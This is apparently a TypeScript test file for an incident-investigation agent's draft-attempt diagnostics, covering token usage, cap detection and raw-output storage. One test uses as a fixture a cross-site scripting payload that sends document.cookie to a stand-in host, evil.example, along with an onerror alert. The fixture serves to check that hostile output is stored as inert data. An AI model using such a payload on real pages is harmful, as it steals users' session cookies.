// Makes a failed draft attempt diagnosable: completion_tokens, max_tokens, whether the limit was
// hit, and the raw output are saved per attempt and surface in the incident view's attempts list.
// This does not change the draft prompt, schema, or validation.

import { env } from "cloudflare:workers";
import { introspectWorkflowInstance } from "cloudflare:test";
import { describe, expect, it } from "vitest";
import type { ModelResponse } from "../../src/model/client";
import { agentNamed, waitForIncident } from "./helpers";

const SYMPTOM = "login latency spiked and users are getting locked out";

async function attemptsFor(agent: Awaited<ReturnType<typeof agentNamed>>, incidentId: string) {
  const state = await agent.state;
  const view = state.incidents.find((i) => i.id === incidentId);
  if (!view) throw new Error("incident missing from state");
  return view.attempts;
}

describe("draft attempt diagnostics", () => {
  it("records completion tokens, the max-tokens cap, and whether it was hit", async () => {
    const agent = await agentNamed("diag-usage");
    const pending = agent.startInvestigation(SYMPTOM);
    const { incidentId } = await pending;
    await using instance = await introspectWorkflowInstance(env.INVESTIGATION_WORKFLOW, incidentId);
    await waitForIncident(agent, incidentId, ["awaiting-approval", "failed"]);

    // A synthetic extra attempt on the same incident, standing in for a real model response that
    // hit the completion cap: recordDraft is what the Workflow calls for every draft attempt,
    // real or fake, so calling it directly here exercises exactly the path a truncated
    // credential-stuffing draft would take.
    const cutOff: ModelResponse = { kind: "ok", raw: '{"rule": {"kind": "and", "left":', usage: { promptTokens: 900, completionTokens: 1024, neurons: 209.87, maxTokens: 1024 } };
    await agent.recordDraft(incidentId, 97, cutOff);

    const attempts = await attemptsFor(agent, incidentId);
    const recorded = attempts.find((a) => a.attempt === 97);
    if (!recorded) throw new Error("synthetic attempt not in state");
    expect(recorded.usage).toEqual({ completionTokens: 1024, maxTokens: 1024, hitMaxTokens: true });
    expect(recorded.rawModelOutput).toBe(cutOff.raw);
    void instance;
  });

  it("records hitMaxTokens as false when the call finished under the cap", async () => {
    const agent = await agentNamed("diag-under-cap");
    const { incidentId } = await agent.startInvestigation(SYMPTOM);
    await using instance = await introspectWorkflowInstance(env.INVESTIGATION_WORKFLOW, incidentId);
    await waitForIncident(agent, incidentId, ["awaiting-approval", "failed"]);

    const short: ModelResponse = { kind: "ok", raw: "{}", usage: { promptTokens: 500, completionTokens: 40, neurons: 8.5, maxTokens: 1024 } };
    await agent.recordDraft(incidentId, 98, short);

    const attempts = await attemptsFor(agent, incidentId);
    const recorded = attempts.find((a) => a.attempt === 98);
    if (!recorded) throw new Error("synthetic attempt not in state");
    expect(recorded.usage).toEqual({ completionTokens: 40, maxTokens: 1024, hitMaxTokens: false });
    void instance;
  });

  it("records no usage for a call that reported none, without throwing", async () => {
    const agent = await agentNamed("diag-no-usage");
    const { incidentId } = await agent.startInvestigation(SYMPTOM);
    await using instance = await introspectWorkflowInstance(env.INVESTIGATION_WORKFLOW, incidentId);
    await waitForIncident(agent, incidentId, ["awaiting-approval", "failed"]);

    const noUsage: ModelResponse = { kind: "ok", raw: "{}" };
    await agent.recordDraft(incidentId, 99, noUsage);

    const attempts = await attemptsFor(agent, incidentId);
    const recorded = attempts.find((a) => a.attempt === 99);
    if (!recorded) throw new Error("synthetic attempt not in state");
    expect(recorded.usage).toBeNull();
    void instance;
  });

  it("stores raw output containing HTML and script tags verbatim, as data, not markup", async () => {
    const agent = await agentNamed("diag-raw-html");
    const { incidentId } = await agent.startInvestigation(SYMPTOM);
    await using instance = await introspectWorkflowInstance(env.INVESTIGATION_WORKFLOW, incidentId);
    await waitForIncident(agent, incidentId, ["awaiting-approval", "failed"]);

    const hostile = `<script>window.location="https://evil.example/steal?c="+document.cookie</script>` + "not json at all " + `<img src=x onerror=alert(1)>`;
    const withMarkup: ModelResponse = { kind: "ok", raw: hostile, usage: { promptTokens: 10, completionTokens: 30, neurons: 1, maxTokens: 1024 } };
    await agent.recordDraft(incidentId, 96, withMarkup);

    const attempts = await attemptsFor(agent, incidentId);
    const recorded = attempts.find((a) => a.attempt === 96);
    if (!recorded) throw new Error("synthetic attempt not in state");
    // Persisted byte-for-byte: this layer never strips or escapes it. Only the renderer decides
    // how it reaches a screen (CLAUDE.md invariant 3), and that is covered by
    // test/unit/text-excerpt.test.ts, which the UI's raw-output view is built on.
    expect(recorded.rawModelOutput).toBe(hostile);
    void instance;
  });
});
